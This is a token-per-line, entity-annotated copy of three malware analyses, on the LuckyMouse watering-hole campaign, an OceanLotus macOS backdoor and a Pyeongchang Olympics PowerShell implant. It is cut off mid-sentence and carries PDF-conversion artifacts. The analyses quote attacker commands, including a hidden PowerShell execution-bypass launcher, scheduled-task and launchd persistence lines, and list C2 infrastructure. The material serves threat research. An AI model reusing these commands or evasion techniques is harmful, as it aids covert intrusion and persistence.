weaponized
documents
with
CVE-2017
-118822
(
Microsoft
Office
Equation
Editor
,
widely
used
by
Chinese-speaking
actors
since
December
2017
)
,
we
can
́t
prove
they
were
related
to
this
particular
attack
.

It's
possible
the
actor
used
a
waterhole B_malware.backdoor

to
infect
data
center
employees
.

The
main
C2
used
in
this
campaign
is
bbs.sonypsps[.]com  B_url.unknown
,
which
resolved
to
IP-address
,
that
belongs
to
the
Ukrainian
ISP
network
,
held
by
a
Mikrotik
router
using
firmware
version
6.34.4
(
from
March
2016
)
with
SMBv1
on
board
.

We
suspect
this
router
was
hacked
as
part
of
the
campaign
in
order
to
process
the
malware's
HTTP
requests
.

The
Sonypsps[.]com  B_url.unknown
domain
was
last
updated
using
GoDaddy
on
2017
-05-05
until
2019-03-13
.

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

FMikrotik
router
with
two
-
year
-
old
firmware
and
SMBv1
on
board
used
in
this
campaign

In
March
2017
,
Wikileaks
published
details
about
an
exploit
affecting
Mikrotik
called
ChimayRed
.

According
to
the
documentation
,
however
,
it
doesn't
work
for
firmware
versions
higher
than
6.30
.

This
router
uses
version
6.34
.

There
were
traces
of
HyperBro B_malware.backdoor
in
the
infected
data
center
from
mid
-
November
2017
.

Shortly
after
that
different
users
in
the
country
started
being
redirected
to
the
malicious
domain
update.iaacstudio[.]com
as
a
result
of
the
waterholing
of
government
websites
.

These
events
suggest
that
the
data
center
infected
with
HyperBro B_malware.backdoor
and
the
waterholing
campaign
are
connected
.

What
did
the
malware
do
in
the
data
center
?

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Anti-detection
stages
.

Different
colors
show
the
three
dropped
modules
:
legit
app
(
blue
)
,
launcher
(
green
)
,
and
decompressor
with
the
Trojan
embedded
(
red
)
launcher
(
green
)
,
and
decompressor
with
the
Trojan
embedded
(
red
)

The
initial
module
drops
three
files
that
are
typical
for
Chinese-speaking
actors
:

a
legit
Symantec
pcAnywhere
(
IntgStat.exe
)
for
DLL
side
loading
,
a
.dll
launcher
(
pcalocalresloader.dll
)
and
the
laststage
decompressor
(
thumb.db
)
.

As
a
result
of
all
these
steps
,
the
last
-
stage
Trojan
is
injected
into
svchost.exe's
process
memory
.

The
launcher
module
,
obfuscated
with
the
notorious
Metasploit's
shikata
_
ga
_
nai
encoder
,
is
the
same
for
all
the
droppers
.

The
resulting
deobfuscated
code
performs
typical
side
loading
:

it
patches
pcAnywhere's
image
in
memory
at
its
entry
point
.

The
patched
code
jumps
back
to
the
decryptor's
second
shikata
_
ga
_
nai
iteration
,
but
this
time
as
part
of
the
whitelisted
application
.

This
Metasploit's
encoder
obfuscates
the
last
part
of
the
launcher's
code
,
which
in
turn
resolves
the

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

necessary
API
and
maps
thumb.db
into
the
same
process's
(
pcAnywhere
)
memory
.

The
first
instructions
in
the
mapped
thumb.db
are
for
a
new
shikata_
ga_
nai
iteration
.

T
he
decrypted
code
resolves
the
necessary
API
functions
,
decompresses
the
embedded
PE
file
with
RtlCompressBuffer(
)
using
LZNT
1
and
maps
it
into
memory
.

What
does
the
resulting
watering
hole
look
like
?

The
websites
were
compromised
to
redirect
visitors
to
instances
of
both
ScanBox
and
BEeF
.

These
redirects
were
implemented
by
adding
two
malicious
scripts
obfuscated
by
a
tool
similar
to
the
Dean
Edwards
packer
.

Resulting
script
on
the
compromised
government
websites

Resulting
script
on
the
compromised
government
websites

Users
were
redirected
to
https://google-updata[.]tk:443/hook.js  B_url.unknown
,
a
BEeF
instance
,
and
https://windows-updata[.]tk:443/scanv1.8/i/?1 B_url.unknown
,
an
empty
ScanBox
instance
that
answered
a
small
piece
of
JavaScript
code
.

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Conclusions

LuckyMouse
appears
to
have
been
very
active
recently
.

The
TTPs
for
this
campaign
are
quite
common
for
Chinese-speaking
actors
,
where
they
typically
provide
new
solid
wrappers
(
launcher
and
decompressor
protected
with
shikata
_
ga
_
nai
in
this
case
)
around
their
RAT
s
(
HyperBro B_malware.backdoor
)
.

The
most
unusual
and
interesting
point
here
is
the
target
.

A
national
data
center
is
a
valuable
source
of
data
that
can
also
be
abused
to
compromise
official
websites
.

Another
interesting
point
is
the
Mikrotik
router
,
which
we
believe
was
hacked
specifically
for
the
campaign
.

The
reasons
for
this
are
not
very
clear
:

typically
,
Chinese-speaking
actors
don't
bother
disguising
their
campaigns
.

Maybe
these
are
the
first
steps
in
a
new
stealthier
approach
.

Some
indicators
of
compromise

Droppers

22CBE2B0F1EF3F2B18B4C5AED6D7BB79

0D0320878946A73749111E6C94BF1525

Launcher

ac337bd5f6f18b8fe009e45d65a2b09b

HyperBro
in
-
memory
Trojan

04dece2662f648f619d9c0377a7ba7c0

Domains
and
IPs

bbs.sonypsps[.]com  B_url.unknown

update.iaacstudio[.]com B_url.unknown

wh0am1.itbaydns[.]com B_url.unknown

google-updata[.]tk  B_url.unknown

windows-updata[.]tk B_url.unknown

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

JAVASCRIPT

TARGETED
ATTACKS

TROJAN

VULNERABILITIES
AND
EXPLOITS

Share
post
on
:

WATERING  B_malware.backdoor
HOLE  I
ATTACKS I

Related
Posts

Related
Posts

VPNFilter
EXIF
to
C2
mechanism
analysed

IT
threat
evolution
Q1
2018
.
Statistics

IT
threat
evolution
Q1
2018

LEAVE
A
REPLY

Your
email
address
will
not
be
published
.

Required
fields
are
marked
*

Enter
your
comment
here

Name
*

Email
*

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Save
my
name
,
email
,
and
website
in
this
browser
for
the
next
time
I
comment
.

Notify
me
when
new
comments
are
added
.

SUBMIT

reCAPTCHA

Please
upgrade
to
a
supported
browser
to
get
a
reCAPTCHA
challenge
.

Alternatively
if
you
think
you
are
getting
this
page
in
error
,
please
check
your
internet
connection
and
reload
.

Why
is
this
happening
to
me
?

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

©
2018
AO
Kaspe
rsky
Lab
.

All
Rights
Reserved
.

Registered
trademarks
and
service
marks
are
the
property
of
their
respective
owners
.

Contact
us
|
Privacy
Policy
|
License
Agreement

Email

I
agree
to
provide
my
email
address
to
'
AO
Kaspersky
Lab
'
to
receive
information
about
new
posts
on
the
site
.

I
understand
that
I
can
withdraw
this
consent
at
any
time
via
e-mail
by
clicking
the
'
unsubscribe
'
link
that
I
find
at
the
bottom
of
any
e-mail
sent
to
me
for
the
purposes
mentioned
above
.

SUBSCRIBE

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!
Trend
Micro

About
TrendLabs
Security
Intelligence
Blog

Home

Categories

Home
'
Targeted
Attacks
'
New
MacOS
Backdoor
Linked
to
OceanLotus
Found

New
MacOS
Backdoor
Linked
to
OceanLotus
Found

Posted
on
:
April
4
,
2018
at
9:00
am

Posted
in
:
Targeted
Attacks

Author
:
Jaromir
Horejsi
(
Threat
Researcher
)

We
identified
a
MacOS
backdoor
(
detected
by
Trend
Micro
as
OSX_OCEANLOTUS.D
)
that
we
believe
is
the
latest
version
of
a
threat
used
by
OceanLotus
(
a.k.a.
APT
32
,
APT-C-00
,
SeaLotus
,
and
Cobalt
Kitty
)
.

OceanLotus
was
responsible
for
launching
targeted
attacks
against
human
rights
organizations
,
media
organizations
,
research
institutes
,
and
maritime
construction
firms
.

The
attackers
behind
OSX_OCEANLOTUS.D
target
MacOS
computers
which
have
the
Perl
programming
language
installed
.

The
MacOS
backdoor
was
found
in
a
malicious
Word
document
presumably
distributed
via
email
.

The
document
bears
the
filename
'
2018-PHIẾU
GHI
DANH
THAM
DỰ
TĨNH
HỘI
HMDC
2018.doc
,
'
which
translates
to
'
2018-REGISTRATION
FORM
OF
HMDC
ASSEMBLY
2018.doc
.
'
The
document
claims
to
be
a
registration
form
for
an
event
with
HDMC
,
an
organization
in
Vietnam
that
advertises
national
independence
and
democracy
.

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Search
:

Featured
Stories

systemd
Vulnerability
Leads
to
Denial
of
Service
on
Linux

qkG
Filecoder
:
Self-Replicating
,
Document-
Encrypting
Ransomware

Mitigating
CVE-2017-5689
,
an
Intel
Management

Engine
Vulnerability

A
Closer
Look
at
North
Korea's
Internet

From
Cybercrime
to
Cyberpropaganda

Security
Predictions
for
2018

Attackers
are
banking
on
network
vulnerabilities
and
inherent
weaknesses
to
facilitate
massive
malware
attacks
,
IoT
hacks
,
and
operational
disruptions
.

The
ever
-
shifting
threats
and
increasingly
expanding
attack
surface
will
challenge
users
and
enterprises
to
catch
up
with
their
security
.

Read
our
security
predictions
for
2018
.

Business
Process
Compromise

Attackers
are
starting
to
invest
in
longterm
operations
that
target
specific
processes
enterprises
rely
on
.

They
scout
for
vulnerable
practices
,
susceptible
systems
and
operational
loopholes
that
they
can
leverage
or
abuse
.

To
learn
more
,
read
our
Security
101
:
Business
Process
Compromise
.

Recent
Posts

New
MacOS
Backdoor
Linked
to
OceanLotus
Found

Cryptocurrency
Web
Miner
Script
Injected
into
AOL
Advertising
Platform

ChessMaster
Adds
Updated
Tools
to
Its
Arsenal

Monero
-
Mining
HiddenMiner
Android
Malware
Can
Potentially
Cause
Device
Failure

A
Closer
Look
at
Unpopular
Software
Downloads
and
the
Risks
They
Pose
to
Organizations

Figure
1
.
Graphic
used
by
the
malicious
document

Upon
receiving
the
malicious
document
,
the
user
is
advised
to
enable
macros
.

In
our
analysis
,
the
macro
is
obfuscated
,
character
by
character
,
using
the
decimal
ASCII
code
.

This
is
shown
in
the
figure
below
.

Figure
2
.
Code
snippet
of
the
obfuscated
document

After
deobfuscation
,
we
can
see
that
the
payload
is
written
in
the
Perl
programming
language
.

It
extracts
theme0.xml
file
from
the
Word
document
.

theme0.xml
is
a
Mach-O
32-bit
executable
with
a
0xFEEDFACE
signature
that
is
also
the
dropper
of
the
backdoor
,
which
is
the
final
payload
.

theme0.xml
is
extracted
to
/tmp/system/word/theme/syslogd
before
it's
executed
.

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Popular
Posts

Homemade
Browser
Targeting
Banco
do
Brasil
Users

Campaign
Possibly
Connected
to
'
MuddyWater
'
Surfaces
in
the
Middle
East
and
Central
Asia

Monero
-
Mining
HiddenMiner
Android
Malware
Can
Potentially
Cause
Device
Failure

Cryptocurrency
Miner
Distributed
via
PHP

Weathermap
Vulnerability
,
Targets
Linux
Servers

Figure
3
.
Deobfuscated
Perl
payload
from
the
delivery
document

Tropic
Trooper's
New
Strategy

Dropper
analysis

The
dropper
is
used
to
install
the
backdoor
into
the
infected
system
and
establish
its
persistence
.

Stay
Updated

Figure
4
.
The
main
function
of
the
dropper

All
strings
within
the
dropper
,
as
well
as
the
backdoor
,
are
encrypted
using
a
hardcoded
RSA256
key
.

There
are
two
forms
of
encrypted
strings
:
an
RSA256
-
encrypted
string
,
and
custom
base64encoded
and
RSA256
-
encrypted
string
.

Email
Subscription

Your
email
here

Subscribe

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Figure
5
.
Hardcoded
RSA256
key
showing
the
first
20
characters

Using
the
setStartup(
)
method
,
the
dropper
first
checks
if
it
is
running
as
a
root
or
not
.

Based
on
that
,
the
GET_PROCESSPATH
and
GET_PROCESSNAME
methods
will
decrypt
the
hardcoded
path
and
filename
where
the
backdoor
should
be
installed
.

The
locations
:

For
root
user
path
:
/Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/
processname
:
screenassistantd

For
regular
user
path
:
~/Library/Spelling/
processname
:
spellagentd

Subsequently
,
it
implements
the
Loader::installLoader
method
,
reading
the
hardcoded
64-bit
Mach-O
executable
(
magic
value
0xFEEDFACF
)
,
and
writing
to
the
previously
determined
path
and
file
.

Figure
6
.
The
dropper
installs
the
backdoor
,
sets
its
attributes
to
'
hidden
'
,
and
sets
a
random
file

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

date
and
time

When
the
dropper
installs
the
backdoor
,
it
sets
its
attributes
to
'
hidden
'
and
sets
file
date
and
time
to
random
values
using
the
touch
command
:
touch
–t
YYMMDDMM
'
/path/filename
'
>
/dev/null
.

The
access
permissions
will
then
be
changed
to
0x1ed
=
755
,
which
is
equal
to
u=rwx,go=rx
.

Figure
7
.
The
magic
value
0xFEEDFACF
that
belongs
to
Mach-O
Executable
(
64
bit
)

Methods
GET_LAUNCHNAME
and
GET_LABELNAME
will
return
the
hardcoded
name
of
the
property
list
'
.plist
'
for
the
root
user
(
com.apple.screen.assistantd.plist
)
and
for
the
regular
user
(
com.apple.spell.agent.plist
)
.

Afterwards
,
the
persistence
file
will
be
created
in
/Library/LaunchDaemons/
or
~/Library/LaunchAgents/
folder
.

The
RunAtLoad
key
will
command
launchd
to
run
the
daemon
when
the
operating
system
starts
up
,
while
the
KeepAlive
key
will
command
launchd
to
let
the
process
run
indefinitely
.

This
persistence
file
is
also
set
to
hidden
with
a
randomly
generated
file
date
and
time
.

Figure
8
.
Property
list
with
persistence
settings
launchctl
load
/Library/LaunchDaemons/filename.plist
>
/dev/nul
or
launchctl
load

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

~/Library/LaunchAgents/
filename.plist
>
/dev/nul
will
then
command
the
operating
system
to
start
the
dropped
backdoor
file
at
login
.

The
dropper
will
delete
itself
at
the
end
of
the
process
.

Backdoor
analysis

The
main
loop
of
the
backdoor
has
two
main
functions
,
infoClient
and
runHandle
.

infoClient
is
reponsible
for
collecting
OS
info
,
submitting
this
info
to
its
C&C
servers
(
the
servers
are
malicious
in
nature
)
,
and
receiving
additional
C&C
communication
information
.

Meanwhile
,
runHandle
is
responsible
for
the
backdoor
capabilities
.

Figure
9
.
The
main
functions
of
the
backdoor
infoClient
fills
up
the
variables
in
HandlePP
class
.

Figure
10
.
List
of
variables
belonging
to
the
HandlePP
class
clientID
is
an
MD5
hash
derived
from
the
environment
variables
,
while
strClientID
is
a
hexadecimal
representation
of
clientID
.

All
strings
below
are
encrypted
via
AES256
and
base64
encoding
.

The
HandlePP::getClientID
method
uses
the
following
environment
variables
:

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Figure
11
.
Serial
number

Figure
12
.
Hardware
UUID

Figure
13
.
MAC
address

For
the
initial
information
packet
,
the
backdoor
also
collects
the
following
:

Figure
14
.
Randomly
generated
UUID

Figure
15
.
OS
version

Running
getpwuid
->pw_name
,
scutil
–
-get
ComputerName
,
and
uname
–m
will
provide
the
following
returns
respectively
:

Mac
OSX
10.12
.

System
Administrator

<owner's
name>'s
iMac
x86_64

All
these
data
are
scrambled
and
encrypted
before
sending
to
the
C&C
server
.

The
process
is
detailed
below
:

1
.
Scrambling

Class
Parser
has
several
methods
,
one
for
each
variable
type
–
Parser::inBytes
,
Parser::inByte
,

Parser::inString
,
and
Parser::inInt
.

Figure
16
.
Parser::inBytes
method

If
clientID
equals
the
following
sequence
of
bytes
B4
B1
47
BC
52
28
28
73
1F
1A
01
6B
FA
72
C0
73
,
then
the
scrambled
version
is
computed
using
the
third
parameter
(
0x10
)
,
which
is
treated
as
a
DWORD
.

Each
quadruple
of
bytes
is
XOR-ed
with
it
,
as
shown
in
example
below
.

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Figure
17
.
Parser::inByte
method

When
scrambling
one
byte
,
the
scrambler
first
determines
if
the
byte
value
is
odd
or
even
.

If
the
value
is
odd
,
it
adds
the
byte
,
along
with
one
more
randomly
generated
byte
,
to
the
array
.

In
the
case
of
an
even
value
,
the
randomly
generated
byte
is
added
first
,
followed
by
the
byte
being
added
.

In
the
case
above
,
the
third
parameter
is
'
1
'
=
0x31
,
which
is
an
odd
number
.

This
means
that
it
adds
byte
'
1
'
and
one
randomly
generated
byte
to
the
final
scrambled
array
.

Figure
18
.
Parser::inString
method

When
scrambling
a
string
,
the
scrambler
generates
a
5-byte
long
sequence
.

First
,
it
generates
one
random
byte
,
followed
by
three
zero
bytes
,
one
random
byte
,
and
finally
,
the
byte
with
the
length
of
the
string
.

Let's
say
we
want
to
scramble
string
'
Mac
OSX
10.12
.
'
Its
length
is
13
=
0x0d
,
and
the
two
random
bytes
are
0xf3
and
0x92
.

The
final
5-byte
sequence
looks
like
F3
00
00
00
92
0D
.

The
original
string
is
then
XOR'ed
with
the
5-byte
sequence
.

Figure
19
.
Scrambling
'
Mac
OSX
10.12
'
2
.
Encryption

The
scrambled
byte
sequence
is
passed
onto
the
constructor
of
the
class
Packet::Packet
,
which
creates
a
random
AES256
key
and
encrypts
the
buffer
with
this
key
.

3
.
Encoding
the
encryption
key

In
order
for
the
C&C
server
to
decrypt
the
encrypted
data
,
the
randomly
generated
AES256
key

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

must
be
included
in
the
packet
along
with
the
encrypted
data
.

However
,
this
key
is
also
scrambled
with
operation
XOR
0x13
followed
by
ROL
6
operation
applied
to
each
byte
.

Figure
20
.
Function
for
scrambling
AES256
key
in
the
outgoing
packet

Some
screenshots
taken
during
scrambling
and
encryption
process
:

Figure
21
.
The
highlighted
bytes
represent
the
scrambled
computer
info

Figure
22
.
Randomly
generated
AES256
key

Figure
23
.
Scrambled
AES256
key
(
0xC1
XOR
0x13
=
0xD2
,
0xD2
ROL
6
=
0xB4
)
etc
.
)

Figure
24
.
Computer
info
encrypted
with
AES256
key

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Figure
25
.
Screenshot
of
the
final
payload
to
be
sent
to
C&C
server
.

The
scrambled
AES256
key
is
marked
green
,
while
the
encrypted
computer
info
is
marked
red
.

Other
bytes
are
just
randomly
generated
noise
.

When
the
backdoor
receives
the
response
from
the
C&C
server
,
the
final
payload
needs
to
be
decoded
again
in
a
similar
manner
via
decryption
and
scrambling
.

Packet::getData
decrypts
the
received
payload
and
Converter::outString
descrambles
the
result
.

The
received
data
from
the
C&C
server
include
the
following
information
:

HandlePP::urlRequest
(
/appleauth/static/cssj/N252394295/widget/auth/app.css
)

HandlePP::keyDecrypt

STRINGDATA::BROWSER_SESSION_ID
(
m_pixel_ratio
)

STRINGDATA::RESOURCE_ID

These
data
will
be
later
used
in
the
C&C
communication
,
as
shown
in
the
Wireshark
screenshot
below
.

Figure
26
.
Communication
with
the
C&C
server
after
the
exchange
of
OS
packet
info

Meanwhile
,
the
runHandle
method
of
the
main
backdoor
loop
will
call
for
the
requestServer
method
with
the
following
backdoor
commands
(
each
command
has
one
byte
long
code
and
is
extracted
by
Packet::getCommand
)
:

Figure
27
.
The
getCommand
method

The
figure
below
shows
the
example
of
two
of
several
possible
command
codes
.

Both
create
one
thread
,
and
each
thread
is
responsible
for
either
downloading
and
executing
the
file
or
running
a
command
line
program
in
the
terminal
:

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Figure
28
.
Commands
used
for
downloading
and
executing
,
and
running
a
command
in
terminal

Figure
29
.
Commands
used
in
uploading
and
downloading
file

Figure
30
.
Supported
commands
and
their
respective
codes

Mitigation

Malicious
attacks
targeting
Mac
devices
are
not
as
common
as
its
counterparts
,
but
the
discovery
of
this
new
MacOS
backdoor
that
is
presumably
distributed
via
phishing
email
calls
for
every
user
to
adopt
best
practices
for
phishing
attacks
regardless
of
operating
system
.

End
users
can
benefit
from
security
solutions
such
as
Trend
Micro
Home
Security
for
Mac
,
which
provides
comprehensive
security
and
multi-device
protection
against
cyberthreats
.

Enterprises

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

can
benefit
from
Trend
Micro's
Smart
Protection
Suites
with
XGenTM
security
,
which
infuses
highfidelity
machine
learning
into
a
blend
of
threat
protection
techniques
to
eliminate
security
gaps
across
any
user
activity
and
any
endpoint
.

Indicators
of
Compromise
(
IoCs
)

C&C
servers

Ssl[.]arkouthrie[.]com B_url.cncsvr

s3[.]hiahornber[.]com B_url.cncsvr

widget[.]shoreoa[.]com B_url.cncsvr

SHA256

Delivery
document
(
W2KM_OCEANLOTUS.A
)
:

2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a B_hash

4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4 B_hash

Dropper
(
OSX_OCEANLOTUS.D
)
:

673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f B_hash

Backdoor
(
OSX_OCEANLOTUS.D
)
:

Related
Posts
:

Related
Posts
:

Backdoor
-
carrying
Emails
Set
Sights
on
Russian-speaking
Businesses

SYSCON
Backdoor
Uses
FTP
as
a
C&C
Channel

October
macOS
Patch
Fixes
FAT
/
USB
Vulnerability

OSX
Malware
Linked
to
Operation
Emmental
Hijacks
User
Network
Traffic

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Learn
how
to
protect
Enterprises
,
Small
Businesses
,
and
Home
Users
from
ransomware
:

ENTERPRISE

SMALL
BUSINESS

HOME

Tags
:

MacOS
backdoor

OceanLotus

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

HOME
AND
HOME
OFFICE

|

FOR
BUSINESS

|

SECURITY
INTELLIGENCE

|

ABOUT
TREND
MICRO

Asia
Pacific
Region
(
APAC
)
:
Australia
/
New
Zealand
,
中国
,
日本
,
대한민국
,
台灣

Europe
,
Middle
East
,
&
Africa
Region
(
EMEA
)
:
France
,
Deutschland
/
Österreich
/
Schw
eiz
,
Italia
,
Россия
,
España
,
United
Kingdom
/
Ireland

Latin
America
Region
(
LAR
)
:
Brasil
,
México

North
America
Region
(
NABU
)
:
United
States
,
Canada

Privacy
Statement

Legal
Policies

Copyright
©
2018
Trend
Micro
Incorporated
.
All
rights
reserved
.

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!
(
https://securingtomorrow.mcafee.com/ B_url.normal
)

Malicious
Document
Targets
Pyeongchang

Olympics

By
Ryan
Sherstobito 
(
https://securingtomorrow.mcafee.com/author/ryan-sherstobito / B_url.normal
)
and
Jessica
Saavedra-Morales
(
https://securingtomorrow.mcafee.com/author/jessica-saavedra-morales/ B_url.normal
)
on
Jan
06
,
2018
(
https://securingtomorrow.mcafee.com/2018/01/ B_url.normal
)

McAfee
Advanced
Threat
Research
analysts
have
discovered
a
campaign
targeting
organizations
involved
with
the
Pyeongchang
Olympics
.

Attached
in
an
email
was
a
malicious
Microsoft
Word
document
with
the
original
 le
name
.doc
(
'
Organized
by
Ministry
of
Agriculture
and
Forestry
and
Pyeongchang
Winter
Olympics
'
)
.

The
primary
target
of
the
email
was
icehockey@pyeongchang2018.com
,
with
several
organizations
in
South
Korea
on
the
BCC
line
.

The
majority
of
these
organizations
had
some
association
with
the
Olympics
,
either
in
providing
infrastructure
or
in
a
supporting
role
.

The
attackers
appear
to
be
casting
a
wide
net
with
this
campaign
.

The
campaign
to
target
Pyeongchang
Olympics
began
December
22
,
2017
with
the
most
recent
activity
appearing
December
28
.

The
attackers
originally
embedded
an
implant
into
the
malicious
document
as
a
hypertext
application
(
HTA
)
 le
,
and
then
quickly
moved
to
hide
it
in
an
image
on
a
remote
server
and
used
obfuscated
Visual
Basic
macros
to
launch
the
decoder
script
.

They
also
wrote
custom
PowerShell
code
to
decode
the
hidden
image
and
reveal
the
implant
.

Analysis

The
malicious
document
was
submitted
from
South
Korea
to
Virus
Total
on
December
29
at
09:04
,
a
day
after
the
original
email
was
sent
to
the
target
list
.

The
email
was
sent
from
the
IP
address
43.249.39.152 B_ip.cncsvr
,
in
Singapore
,
on
December
28
at
23:34
.


The
attacker
spoofed
the
message
to
appear
to
be
from
info@nctc.go.kr
,
which
is
the
National
Counter
-
Terrorism
Center
(
NCTC
)
in
South
Korea
.

The
timing
is
interesting
because
the
NCTC
was
in
the
process
of
conducting
physical
antiterror
drills
in
the
region
in
preparation
for
the
Olympic
Games
.

The
spoofed
source
of
this
email
suggests
the
message
is
legitimate
and
increases
the
chances
that
victims
will
treat
it
as
such
.

Based
on
our
analysis
of
the
email
header
,
this
message
did
not
come
from
NCTC
,
rather
from
the
attacker's
IP
address
in
Singapore
.

The
message
was
sent
from
a
Post x
email
server
and
originated
from
the
hostname
ospf1-apacsg.stickyadstv.com B_url.unknown
.

When
the
user
opens
the
document
,
text
in
Korean
tells
the
victim
to
enable
content
to
allow
the
document
to
be
opened
in
their
version
of
Word
.

The
malicious
document
with
instructions
to
enable
content
.

The
enable
content
message
.

The
document
contains
an
obfuscated
Visual
Basic
macro
:

Visual
Basic
macro
.

The
malicious
document
launches
a
PowerShell
script
when
the
user
clicks
'
Enable
Content
.
'
The
document
was
created
on
December
27
at
15:52
by
the
author
'
John
.
'

The
malicious
document
launches
the
following
PowerShell
script
:

Manually
executing
the
PowerShell
script
at
the
command
line
.

The
script
downloads
and
reads
an
image
le
from
a
remote
location
and
carves
out
a
hidden
PowerShell
implant
script
embedded
within
the
image
le
to
execute
.

The
attackers
used
the
open
-
source
tool
Invoke
-
PSImage
,
released
December
20
,
to
embed
the
PowerShell
script
into
the
image
le
.

The
steganography
tool
works
by
embedding
the
bytes
of
a
script
into
the
pixels
of
the
image
le
,
giving
the
attacker
the
ability
to
hide
malicious
PowerShell
code
in
a
visible
image
on
a
remote
server
.

The
following
script
can
be
identi
ed
as
generated
by
Invoke
-
PSImage
to
execute
the
attacker's
implant
in
an
image
from
a
remote
server
.

The
initial
PowerShell
script
.

The
image
that
contains
the
hidden
PowerShell
code
.

To
verify
the
usage
of
steganography
,
we
employed
the
tool
StegExpose
to
check
the
le
:

The
result
con
rms
the
presence
of
hidden
data
in
our
le
.

Once
the
script
runs
,
it
passes
the
decoded
script
from
the
image
le
to
the
Windows
command
line
in
a
variable
$x
,
which
uses
cmd.exe
to
execute
the
obfuscated
script
and
run
it
via
PowerShell
.

&&set
xmd=echo
iex
(
ls
env:tjdm).value
^|
powershell
-noni
-noex
-execut
bypass
-nopro le
-wind
hidden
–
&&
cmd
/C%xmd%

The
extracted
script
is
heavily
disguised
,
using
a
combination
of
string
-
format
operator
obfuscation
and
other
string-based
obfuscation
techniques
.

The
obfuscated
PowerShell
implant
script
.

The
attacker's
objective
is
to
make
analysis
di cult
and
to
evade
detection
technologies
that
rely
on
pattern
matching
.

Because
the
obfuscation
makes
use
of
native
functions
in
PowerShell
,
the
script
can
run
in
an
obfuscated
state
and
work
correctly
.

Obfuscated
control
servers
.

When
we
deobfuscate
the
control
server
URLs
,
the
implant
establishes
a
connection
to
the
following
site
over
SSL
:
hxxps://www.thlsystems.for rst.cz:443/components/com_tags/views/login/process.php B_url.unknown
.

Based
on
our
analysis
,
this
implant
establishes
an
encrypted
channel
to
the
attacker's
server
,
likely
giving
the
attacker
the
ability
to
execute
commands
on
the
victim's
machine
and
to
install
additional
malware
.

Ultimately
this
PowerShell
implant
will
be
set
to
automatically
start
daily
at
2
am
via
a
scheduled
task
(
shown
below
)
.

The
view.hta
contains
the
same
PowerShell
-
based
implant
and
establishes
a
remote
connection
over
SSL
to
hxxps://200.122.181.63:443/components/com_tags/views/news.php B_url.unknown
.

C:\Windows\system32\schtasks.exe
'
/Create
/F
/SC
DAILY
/ST
14:00
/TN
'
MS
Remoute
Update
'
/TR

C:\Users\Ops03\AppData\Local\view.hta

The
contents
of
view.hta
.

During
our
research
,
we
discovered
a
cached
Apache
server
log
for
the
IP
address
81.31.47.101 B_ip.unknown
,
which
is
shared
hosting
.

This
log
contained
information
for
the
control
server
thlsystems.for rst.cz
,
which
showed
an
IP
address
from
South
Korea
connecting
to
the
speci
c
URL
paths
contained
in
the
PowerShell
implants
.

This
indicates
that
the
implant
was
active
in
South
Korea
and
targets
were
likely
being
infected
.

Apache
server
log
from
December
29
,
2017
.

While
investigating
thlsystems.for
rst.cz
we
discovered
that
the
webpage
belongs
to
a
legitimate
entity
,
suggesting
this
is
a
compromised
server
being
used
as
both
an
encrypted
backchannel
for
the
attacker
and
the
distribution
of
implants
.

The
server
also
hosts
a
copy
of
the
obfuscated
PowerShell
implant
.

The
implant
establishes
an
encrypted
channel
to
the
following
URL
path
:
hxxps://www.thlsystems.for rst.cz:443/components/com_tags/views/admin/get.php B_url.unknown

An
image
from
December
30
,
2017
.

When
investigating
the
IP
address
from
the
PowerShell
implant
200.122.181.63 B_ip.unknown
we
found
a
server
in
Costa
Rica
that
resolves
to
mafra.go.kr.jeojang.ga B_url.unknown
.

The
domain
jeojang.ga
was
registered
via
Freenom
,
a
free
anonymous
domain
provider
.

It
appears
the
attacker
is
using
parts
of
a
domain
that
belong
to
the
South
Korean
Ministry
of
Agriculture
and
Forestry
,
which
is
in
line
with
the
attached
document
name
in
the
email
,
but
this
domain
has
nothing
to
do
with
this
government
agency
.

A
version
of
the
malicious
document
from
December
22
embedded
the
PowerShell
implant
directly
into
the
Word
document
in
the
form
of
an
HTA
le
.

McAfee
Advanced
Threat
Research
analysts
discovered
another
document
that
was
hosted
at
this
domain;
its
original
title
is
).docx
,
which
also
appears
to
come
from
the
Ministry
of
Agriculture
and
Forestry
.

This
document
was
created
on
December
22
by
the
same
author
,
'
John
.
'
The
document
does
not
contain
macros
,
rather
OLE
streams
for
the
embedded
HTA
les
.

When
the
Koreanlanguage
docx
icon
is
clicked
,
it
launches
the
embedded
HTA
 le
Error733.hta
.

This
le
contains
the
same
script
code
to
launch
the
PowerShell
implant
as
in
the
view.hta
example
.

An
earlier
malicious
document
that
relies
on
OLE
streams
.

Conclusion

The
basic
method
in
this
case
,
an
in-memory
implant
using
PowerShell
along
with
obfuscation
to
avoid
detection
,
is
a
common
and
increasing
popular
leless
technique
used
in
cyberattacks
.

We
have
not
previously
seen
this
kind
of
attack
targeting
victims
in
South
Korea
.

The
use
of
the
steganography
tool
shows
how
